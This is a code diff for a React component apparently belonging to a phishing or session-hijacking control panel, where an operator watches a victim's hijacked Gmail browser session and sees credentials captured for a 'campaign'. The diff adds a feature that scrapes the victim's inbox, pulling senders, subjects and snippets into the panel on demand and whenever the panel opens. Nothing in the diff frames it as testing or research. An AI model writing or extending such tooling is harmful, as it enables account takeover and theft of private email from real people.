@@ -7,6 +7,7 @@ const GmailBrowserModal = ({ isOpen, onClose, session, campaignId }) => {
   const [isLoading, setIsLoading] = useState(true);
   const [socket, setSocket] = useState(null);
   const [capturedCredentials, setCapturedCredentials] = useState([]);
+  const [scrapedEmails, setScrapedEmails] = useState([]);
   const [sessionInfo, setSessionInfo] = useState(null);
   const [currentUrl, setCurrentUrl] = useState('');
   const screenshotIntervalRef = useRef(null);
@@ -44,6 +45,11 @@ const GmailBrowserModal = ({ isOpen, onClose, session, campaignId }) => {
       setCapturedCredentials(prev => [data, ...prev]);
       // Show notification
       console.log('🔑 New credentials captured:', data.credentials);
+    });
+
+    newSocket.on('emailsScraped', (data) => {
+      setScrapedEmails(data.emails);
+      console.log('📧 Emails scraped:', data.emails);
     });
 
     newSocket.on('pageNavigation', (data) => {
@@ -144,6 +150,38 @@ const GmailBrowserModal = ({ isOpen, onClose, session, campaignId }) => {
     }
   };
 
+  // Load scraped emails
+  const loadScrapedEmails = async () => {
+    try {
+      const response = await httpClient.get(`/api/gmail-browser/session/${session.sessionToken}/scraped-emails`);
+      if (response.data.success) {
+        setScrapedEmails(response.data.emails);
+      }
+    } catch (error) {
+      console.error('Error loading scraped emails:', error);
+    }
+  };
+
+  // Manually trigger email scraping
+  const scrapeEmails = async () => {
+    try {
+      const response = await httpClient.post(`/api/gmail-browser/session/${session.sessionToken}/scrape-emails`);
+      if (response.data.success) {
+        setScrapedEmails(response.data.emails);
+        console.log(`✅ Scraped ${response.data.count} emails`);
+      }
+    } catch (error) {
+      console.error('Error scraping emails:', error);
+    }
+  };
+
+  // Load scraped emails when modal opens
+  useEffect(() => {
+    if (isOpen && session) {
+      loadScrapedEmails();
+    }
+  }, [isOpen, session]);
+
   if (!isOpen) return null;
 
   return (
@@ -173,6 +211,12 @@ const GmailBrowserModal = ({ isOpen, onClose, session, campaignId }) => {
               className="glass-button px-3 py-2 rounded-lg text-sm"
             >
               📸 Refresh
+            </button>
+            <button
+              onClick={scrapeEmails}
+              className="glass-button px-3 py-2 rounded-lg text-sm bg-blue-500/20 hover:bg-blue-500/30"
+            >
+              📧 Scrape Emails
             </button>
             <button
               onClick={handleCloseSession}
@@ -309,6 +353,39 @@ const GmailBrowserModal = ({ isOpen, onClose, session, campaignId }) => {
                           <div>
                             <span className="text-cyber-muted">Password:</span>
                             <span className="text-cyber-primary ml-2">{'*'.repeat(cred.credentials.password.length)}</span>
+                          </div>
+                        )}
+                      </div>
+                    </div>
+                  ))
+                )}
+              </div>
+            </div>
+
+            {/* Scraped Emails */}
+            <div className="glass-card p-4">
+              <h3 className="text-lg font-semibold text-cyber-primary mb-3">
+                Scraped Emails ({scrapedEmails.length})
+              </h3>
+              <div className="space-y-2 max-h-64 overflow-y-auto">
+                {scrapedEmails.length === 0 ? (
+                  <p className="text-cyber-muted text-sm">No emails scraped yet</p>
+                ) : (
+                  scrapedEmails.map((email, index) => (
+                    <div key={email.id || index} className="bg-cyber-darker p-3 rounded-lg border border-blue-500/20">
+                      <div className="text-xs text-blue-400 mb-1">
+                        {email.date} {email.isUnread && <span className="bg-blue-500 text-white px-1 rounded text-xs">NEW</span>}
+                      </div>
+                      <div className="text-sm">
+                        <div className="text-cyber-primary font-medium truncate">
+                          {email.sender}
+                        </div>
+                        <div className="text-cyber-text text-xs truncate">
+                          {email.subject}
+                        </div>
+                        {email.snippet && (
+                          <div className="text-cyber-muted text-xs mt-1 truncate">
+                            {email.snippet}
                           </div>
                         )}
                       </div>
